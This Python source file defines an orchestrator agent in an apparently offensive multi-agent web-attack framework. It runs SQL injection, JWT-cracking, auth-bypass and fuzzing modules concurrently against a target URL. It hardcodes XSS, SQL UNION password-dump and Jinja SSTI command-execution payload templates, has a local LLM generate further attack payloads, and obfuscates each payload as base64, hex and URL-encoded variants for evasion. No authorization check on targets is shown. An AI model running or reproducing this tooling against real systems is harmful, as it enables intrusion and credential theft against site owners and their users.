import asyncio
import base64
import random
import urllib.parse
from backend.core.hive import BaseAgent, EventType, HiveEvent
from backend.core.protocol import JobPacket, ResultPacket, AgentID, TaskTarget, ModuleConfig, TaskPriority
from backend.ai.cortex import CortexEngine
import json
import aiohttp
from backend.core.graph_engine import graph_engine

# Import Arsenals
from backend.modules.tech.sqli import SQLInjectionProbe
from backend.modules.tech.fuzzer import APIFuzzer
from backend.modules.tech.jwt import JWTTokenCracker
from backend.modules.tech.auth_bypass import AuthBypassTester
from backend.modules.logic.tycoon import TheTycoon
from backend.modules.logic.doppelganger import Doppelganger
from backend.modules.logic.skipper import TheSkipper
from backend.modules.logic.chronomancer import Chronomancer
from backend.modules.logic.escalator import TheEscalator

class SigmaAgent(BaseAgent):
    """
    AGENT SIGMA: THE ORCHESTRATOR
    Role: Execution Pipeline & Generative Weaponssmith.
    Capabilities:
    - Hosts all 9 Arsenal Modules natively.
    - Resolves pure math payloads to network IO state arrays.
    - AI-Powered Context-Aware Payload Generation.
    """
    def __init__(self, bus):
        super().__init__("agent_sigma", bus)
        
        # CORTEX AI Generator
        try:
            self.ai = CortexEngine()
        except Exception:self.ai = None

        # Stage 10 Hardening: Persistent session for high-concurrency network tasks
        self._session = None
        # Governance: throttle flag from Zeta
        self._throttled = False

        self.arsenal = {
            "tech_sqli": SQLInjectionProbe(),
            "tech_fuzzer": APIFuzzer(),
            "tech_jwt": JWTTokenCracker(),
            "tech_auth_bypass": AuthBypassTester(),
            "logic_tycoon": TheTycoon(),
            "logic_doppelganger": Doppelganger(),
            "logic_skipper": TheSkipper(),
            "logic_chronomancer": Chronomancer(),
            "logic_escalator": TheEscalator()
        }

        self.payload_templates = [
            "<script>alert('{context_var}')</script>",
            "UNION SELECT {context_table}, password FROM users--",
            "{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}"
        ]

    async def setup(self):
        # Listen for requests to generate payloads (e.g. from Beta)
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_generation_request)
        # Governance: respond to Zeta's control signals
        self.bus.subscribe(EventType.CONTROL_SIGNAL, self.handle_control_signal)

    async def handle_control_signal(self, event: HiveEvent):
        """Respond to Zeta governance signals."""
        signal = event.payload.get("signal", "")
        if signal in ["THROTTLE", "STEALTH_MODE"]:
            self._throttled = True
            print(f"[{self.name}] Governance: {signal} received. Throttling payload generation.")
        elif signal == "RESUME":
            self._throttled = False

    async def _fetch(self, target: TaskTarget) -> tuple[TaskTarget, str]:
        try:
            kwargs = {}
            if target.payload:
                if target.method.upper() in ["POST", "PUT", "PATCH"]:
                    if "Content-Type" in target.headers and "application/x-www-form-urlencoded" in target.headers["Content-Type"]:
                        kwargs["data"] = target.payload
                    else:
                        kwargs["json"] = target.payload
                        
            # Stage 10 Optimization: Reuse persistent session to prevent port exhaustion
            if self._session is None or self._session.closed:
                timeout = aiohttp.ClientTimeout(total=10)
                self._session = aiohttp.ClientSession(timeout=timeout)
                
            async with self._session.request(target.method, target.url, headers=target.headers, **kwargs) as resp:
                chunks = []
                async for chunk in resp.content.iter_chunked(1024 * 64):
                    chunks.append(chunk)
                    if sum(len(c) for c in chunks) > 5 * 1024 * 1024:
                        break
                text = b"".join(chunks).decode("utf-8", errors="replace")
                return target, text
        except Exception as e:
            return target, ""

    async def handle_generation_request(self, event: HiveEvent):
        packet_dict = event.payload
        try:
             packet = JobPacket(**packet_dict)
        except Exception:return

        if packet.config.agent_id != AgentID.SIGMA:
            return

        module_id = packet.config.module_id
        
        if module_id in self.arsenal:
            print(f"[{self.name}] [PLAN] Orchestrating '{module_id}' execution on {packet.target.url}")
            
            # STAGE 11: HYBRID GRAPH ENGINE PREDICTION
            predictions = graph_engine.predict_next(module_id, packet.target.url)
            if predictions:
                top_pred = predictions[0]
                print(f"[{self.name}] [GRAPH AI] Intelligence predicts {top_pred['suggestion']} is {top_pred['confidence']}% likely next.")
                # We could mutate the packet here to chain modules, but for safety we just log the intelligence advantage for now.
                
            module = self.arsenal[module_id]
            
            # 1. PLAN: Generate target payloads
            targets = await module.generate_payloads(packet)
            if not targets:
                await self.bus.publish(HiveEvent(type=EventType.JOB_COMPLETED, source=self.name, payload={"job_id": packet.id, "status": "SUCCESS"}))
                return
            
            # BROADCAST LIVE ATTACK INTENT
            await self.bus.publish(HiveEvent(
                type=EventType.LIVE_ATTACK,
                source=self.name,
                payload={
                    "url": packet.target.url,
                    "arsenal": module_id,
                    "action": "Orchestrating multi-vector assault",
                    "payload_count": len(targets)
                }
            ))
                
            # 2. EXECUTE: Concurrently fetch
            # Cyber-Organism Protocol: Native gathered orchestration
            print(f"[{self.name}] [EXECUTE] Dispatching {len(targets)} asynchronous network tasks...")
            
            # Task wrapper for granular broadcasting
            async def broadcast_fetch(t):
                await self.bus.publish(HiveEvent(
                    type=EventType.LIVE_ATTACK,
                    source=self.name,
                    payload={
                        "url": t.url,
                        "arsenal": module_id,
                        "action": "Injecting weaponized payload",
                        "payload": str(t.payload)[:100] + ("..." if len(str(t.payload)) > 100 else "")
                    }
                ))
                return await self._fetch(t)

            results = await asyncio.gather(*[broadcast_fetch(t) for t in targets])
            
            # 3. OBSERVE: Analyze interactions
            print(f"[{self.name}] [OBSERVE] Applying pure module evaluation...")
            vulns = await module.analyze_responses(list(results), packet)
            
            # REAL-TIME SYNC: Publish VULN_CONFIRMED if found
            if vulns:
                for v in vulns:
                    await self.bus.publish(HiveEvent(
                        type=EventType.VULN_CONFIRMED,
                        source=self.name,
                        payload={
                            "type": module_id.upper(),
                            "url": packet.target.url,
                            "severity": getattr(v, "severity", "HIGH"),
                            "payload": str(packet.target.payload),
                            "evidence": getattr(v, "evidence", "None")
                        }
                    ))
            
            await self.bus.publish(HiveEvent(
                type=EventType.JOB_COMPLETED,
                source=self.name,
                payload={
                    "job_id": packet.id,
                    "status": "VULN_FOUND" if vulns else "SUCCESS",
                    "vulnerabilities": [v.model_dump() for v in vulns]
                }
            ))
            return
            
        # 4. IF SIGMA_BYPASS (Weaponssmith generation)
        print(f"[{self.name}] Forging evasion payloads for {packet.target.url}...")
        
        # 1. CONTEXT AWARE GENERATION
        generated_payloads = []
        
        # Try AI First (Ollama Cortex)
        if self.ai and self.ai.enabled:
             print(f"[{self.name}] >> CORTEX AI: Generating context-aware payloads via Ollama...")
             try:
                 ai_payloads = await self.ai.generate_attack_payloads(
                     target_url=packet.target.url,
                     attack_types=["XSS", "SQLi", "SSTI", "Path Traversal"]
                 )
                 if ai_payloads:
                     generated_payloads.extend(ai_payloads)
                     print(f"[{self.name}] >> CORTEX AI: Generated {len(ai_payloads)} intelligent payloads.")
             except Exception as e:
                 print(f"[{self.name}] CORTEX AI Failure. Falling back to templates: {e}")
        
        # Fallback to Templates if AI produced nothing
        if not generated_payloads:
             context = {
                "context_var": "XSS_BY_SIGMA",
                "context_table": "admin_creds",
                "cmd": "id"
             }
             for template in self.payload_templates:
                raw_payload = template.format(**context)
                generated_payloads.append(raw_payload)
        
        # 2. OBFUSCATION ENGINE (Applies to all)
        final_payloads = []
        for raw in generated_payloads:
             final_payloads.append(raw)
             # Add variants
             final_payloads.append(self.obfuscate(raw, "base64"))
             final_payloads.append(self.obfuscate(raw, "hex"))
             final_payloads.append(self.obfuscate(raw, "url"))

        # Publish Results (The "Weapon Shipment")
        await self.bus.publish(HiveEvent(
            type=EventType.JOB_COMPLETED,
            source=self.name,
            payload={
                "job_id": packet.id,
                "status": "SUCCESS",
                "target_url": packet.target.url,
                "data": {"generated_payloads": final_payloads}
            }
        ))
        print(f"[{self.name}] Forged {len(final_payloads)} SOTA payloads.")

        # BUG 6 FIX: Explicitly hand off payloads to Beta for execution
        beta_handoff = JobPacket(
            priority=TaskPriority.HIGH,
            target=TaskTarget(url=packet.target.url),
            config=ModuleConfig(
                module_id="sigma_payload_handoff",
                agent_id=AgentID.BETA,
                params={"payloads": final_payloads}
            )
        )
        await self.bus.publish(HiveEvent(
            type=EventType.JOB_ASSIGNED,
            source=self.name,
            payload=beta_handoff.model_dump()
        ))

    def obfuscate(self, payload: str, method: str) -> str:
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "hex":
            return "".join([hex(ord(c)) for c in payload])
        elif method == "url":
            return urllib.parse.quote(payload)
        return payload
